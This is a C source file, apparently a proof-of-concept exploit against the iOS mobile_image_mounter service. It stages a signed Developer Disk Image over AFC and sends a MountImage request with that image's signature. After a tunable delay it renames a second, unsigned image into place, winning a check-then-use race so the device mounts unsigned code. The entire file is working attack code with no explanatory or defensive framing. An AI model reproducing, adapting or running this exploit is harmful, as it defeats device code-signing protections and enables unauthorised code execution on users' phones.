#include "MobileDevice.h"
#include <stdio.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <assert.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

kern_return_t send_message(service_conn_t socket, CFPropertyListRef plist);
CFPropertyListRef receive_message(service_conn_t socket);

static char *real_dmg, *real_dmg_signature, *ddi_dmg;

static void print_data(CFDataRef data) {
    if(data == NULL) {
        printf("[null]\n");
        return;
    }
    printf("[%.*s]\n", (int) CFDataGetLength(data), CFDataGetBytePtr(data));
}


void qwrite(afc_connection *afc, const char *from, const char *to) {
    printf("Sending %s -> %s... ", from, to);
    afc_file_ref ref;

    int fd = open(from, O_RDONLY);
    assert(fd != -1);
    size_t size = (size_t) lseek(fd, 0, SEEK_END);
    void *buf = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
    assert(buf != MAP_FAILED);
    
    AFCFileRefOpen(afc, to, 3, &ref);
    AFCFileRefWrite(afc, ref, buf, size);
    AFCFileRefClose(afc, ref);

    printf("done.\n");

    close(fd);
}

int timesl;

static void cb(am_device_notification_callback_info *info, void *foo) {
    struct am_device *dev;
    printf("... %x\n", info->msg);
    if(info->msg == ADNCI_MSG_CONNECTED) {
        dev = info->dev;

        AMDeviceConnect(dev);
        assert(AMDeviceIsPaired(dev));
        assert(!AMDeviceValidatePairing(dev));
        assert(!AMDeviceStartSession(dev));
        
        service_conn_t afc_socket = 0;
        struct afc_connection *afc = NULL;
        assert(!AMDeviceStartService(dev, CFSTR("com.apple.afc"), &afc_socket, NULL));
        assert(!AFCConnectionOpen(afc_socket, 0, &afc));
        assert(!AFCDirectoryCreate(afc, "PublicStaging"));


        kern_return_t x = AFCRemovePath(afc, "PublicStaging/staging.dimage");
        printf(">> %d << ((%d))", x, timesl);
        //qwrite(afc, real_dmg, "real.dmg");
        qwrite(afc, real_dmg, "PublicStaging/staging.dimage");
        //if(ddi_dmg) qwrite(afc, ddi_dmg, "ddi.dmg");
        if(ddi_dmg) qwrite(afc, ddi_dmg, "PublicStaging/ddi.dimage");

        service_conn_t mim_socket1 = 0;
        service_conn_t mim_socket2 = 0;
        assert(!AMDeviceStartService(dev, CFSTR("com.apple.mobile.mobile_image_mounter"), &mim_socket1, NULL));
        assert(mim_socket1);

        /*if(ddi_dmg) {
            assert(!AMDeviceStartService(dev, CFSTR("com.apple.mobile.mobile_image_mounter"), &mim_socket2, NULL));
            assert(mim_socket2);
        }*/


        CFPropertyListRef result = NULL;
        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
        //CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/real.dmg"));
        CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/staging.dimage"));
        CFDictionarySetValue(dict, CFSTR("ImageType"), CFSTR("Developer"));

        int fd = open(real_dmg_signature, O_RDONLY);
        assert(fd != -1);
        uint8_t sig[128];
        assert(read(fd, sig, sizeof(sig)) == sizeof(sig));
        close(fd);

        CFDictionarySetValue(dict, CFSTR("ImageSignature"), CFDataCreateWithBytesNoCopy(NULL, sig, sizeof(sig), kCFAllocatorNull));
        printf("send 1: %x\n", send_message(mim_socket1, dict));

        if(ddi_dmg) {
            usleep(timesl); 

            assert(!AFCRenamePath(afc, "PublicStaging/ddi.dimage", "PublicStaging/staging.dimage"));

            /*CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/staging.dimage"));
            //CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/ddi.dmg"));

            printf("send 2: %x\n", send_message(mim_socket2, dict));

            printf("receive 2:\n");
            result = receive_message(mim_socket2);
            print_data(CFPropertyListCreateXMLData(NULL, result));*/
        }

        printf("receive 1:\n"); 
        result = receive_message(mim_socket1);
        print_data(CFPropertyListCreateXMLData(NULL, result));

        exit(0);
    }
}

int main(int argc, char **argv) {
    if(argc != 4 && argc != 5) {
        fprintf(stderr, "Usage: race time DeveloperDiskImage.dmg{,.signature} [ddi.dmg]\n");
        return 1;
    }
    timesl = atoi(argv[1]);
    real_dmg = argv[2];
    real_dmg_signature = argv[3];
    ddi_dmg = argv[4];

    AMDAddLogFileDescriptor(2);
    am_device_notification *notif;
    assert(!AMDeviceNotificationSubscribe(cb, 0, 0, NULL, &notif));
    CFRunLoopRun();
    return 0;
}
